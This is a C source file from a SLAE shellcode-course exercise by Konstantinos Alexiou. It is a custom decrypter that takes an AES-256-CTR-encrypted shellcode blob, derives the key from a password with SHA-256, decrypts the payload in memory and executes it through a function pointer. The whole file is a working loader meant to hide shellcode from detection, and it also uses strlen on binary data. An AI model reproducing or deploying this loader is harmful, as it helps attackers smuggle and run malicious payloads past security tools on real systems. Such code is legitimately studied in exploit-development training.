/*
 Filename: Decrypt-AES-ctr-256.c
 Website:  http://securitytube.net
 Training: http://securitytube-training.com
 Desc: Custom shellcode Decrypter using AES-CTR mode with 256bit encryption key 
 Author: konstantinos Alexiou
 SLAE-ID: SLAE-627
 Purpose: SLAE
 Compile :gcc Decrypt-AES-ctr-256.c -o DecryptAES -lcrypto
 */





# include <stdio.h>
# include <string.h>
# include <stdlib.h>
# include <openssl/evp.h>

main(int argc, char **argv)

{
        int K;
	/*
	   The Encrypted shellcode that is going to be Decrypted
	*/
	unsigned char encry_shellcode[] =\
					"\xbf\xe7\xb3\xe3\xda\x87\x6e\x91\x85\x28\xec\xd5\xaa\x57\x09"
					"\x7d\x2f\x3f\x55\x6d\x1c\x3a\x77\xb6\xf7\x39\x83\x76\xb1\xce"
					"\xe5\xf3\x37\x22\x45\xfd\xce\xb7\x42";

 	int encry_shellcode_len;
        encry_shellcode_len=strlen(encry_shellcode);
        printf("\n-----------Encrypted-Shellcode-----------\n");  
          for(K=0;K<encry_shellcode_len;K++)
             {
            printf("\\x%02x", encry_shellcode[K]);
              }
        printf("\n----------------Length=%d----------------\n",encry_shellcode_len);

        /*
           The password is passed as an argument
        */
        unsigned char *key;
        int key_len;
        key = (unsigned char *)argv[1];
        key_len = strlen((unsigned char *)key);
        printf("Password=%s\n",key);
        unsigned char pass[key_len+1];
        strcpy(pass, key);
        pass[key_len]='\n';

        /*
           The password is hashed with sha256 to create 256bits Key length
        */
        EVP_MD_CTX *ctx_dig;
        OpenSSL_add_all_digests();
        unsigned char digest[EVP_MAX_MD_SIZE];
        int digestLen;
        ctx_dig = EVP_MD_CTX_create();
        EVP_DigestInit_ex(ctx_dig, EVP_sha256(),NULL);
        EVP_DigestUpdate(ctx_dig, pass, strlen(pass));
        EVP_DigestFinal_ex(ctx_dig, digest, &digestLen);
        EVP_MD_CTX_destroy(ctx_dig);
        printf("\nSHA256 hash of Password [%s]------\n",key);
        for (K=0; K<digestLen; K++)
            {
             printf("%02x", digest[K]);
            }
        printf("\n------------------------------------------\n");
        printf("\n");
        EVP_cleanup();

	int  declen;
        unsigned char decry_shellcode[encry_shellcode_len];
        unsigned char iv[] = "1234567887654321";
	int (*ret)() = (int(*)())decry_shellcode;

	/* 
	    The Decryption process
	*/
	EVP_CIPHER_CTX ctx_dec;
	EVP_DecryptInit(&ctx_dec, EVP_aes_256_ctr(), digest, iv);
	EVP_DecryptUpdate(&ctx_dec, decry_shellcode, &declen, encry_shellcode, encry_shellcode_len);
	 printf("------------Decrypted-Shellcode-----------\n");
        for(K=0;K<encry_shellcode_len;K++)
         {
        printf("\\x%02x", decry_shellcode[K]);
          }
        printf("\n----------------Length=%d-----------------\n",sizeof(decry_shellcode));

	EVP_CIPHER_CTX_cleanup(&ctx_dec);
	EVP_cleanup();
	CRYPTO_cleanup_all_ex_data();
	printf("\nCall Decryted-Shellcode\n.\n..\n...\n");
	ret();
	printf("\n");
	return 0;

}
